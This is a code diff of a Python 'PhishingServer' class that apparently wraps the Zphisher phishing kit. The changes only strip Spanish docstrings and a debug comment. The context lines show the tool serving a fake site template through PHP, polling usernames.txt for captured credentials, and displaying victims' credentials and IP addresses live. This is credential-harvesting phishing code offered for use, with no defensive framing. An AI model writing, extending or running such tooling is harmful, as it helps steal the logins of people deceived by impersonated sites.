@@ -19,7 +19,6 @@ class PhishingServer:
         self.last_ip = ""
 
     def start(self, site, port=8080):
-        """Inicia el servidor PHP con la plantilla"""
         self.current_site = site
         self.port = port
         self.running = True
@@ -56,7 +55,6 @@ class PhishingServer:
             return False
 
     def _start_watching(self):
-        """Monitorea archivos de Zphisher"""
         self.watching = True
 
         def watch_files():
@@ -76,7 +74,6 @@ class PhishingServer:
                         creds = f.read().strip()
                         if creds and creds != self.last_creds:
                             self.last_creds = creds
-                           # print(f"\n[DEBUG] Contenido de usernames.txt:\n{creds}\n")
                             self._show_creds(creds)
 
                 time.sleep(0.5)
@@ -86,7 +83,6 @@ class PhishingServer:
         thread.start()
 
     def _show_visitor(self, ip):
-        """Muestra visitante en vivo"""
         print()
         print(Colors.colorize("┌" + "─" * 50 + "┐", Colors.BLUE))
         print(Colors.colorize("│ 🌐 NUEVO VISITANTE".ljust(52) + "│", Colors.BLUE))
@@ -125,7 +121,6 @@ class PhishingServer:
         print()
 
     def wait(self):
-        """Mantiene el servidor en ejecución"""
         try:
             while self.running:
                 time.sleep(1)
@@ -133,7 +128,6 @@ class PhishingServer:
             self.stop()
 
     def stop(self):
-        """Detiene el servidor"""
         self.running = False
         self.watching = False
         if self.php_process:
@@ -142,7 +136,6 @@ class PhishingServer:
         Colors.print_info("Servidor detenido")
 
     def get_urls(self):
-        """Devuelve las URLs del servidor"""
         return {
             'local': f'http://localhost:{self.port}'
         }
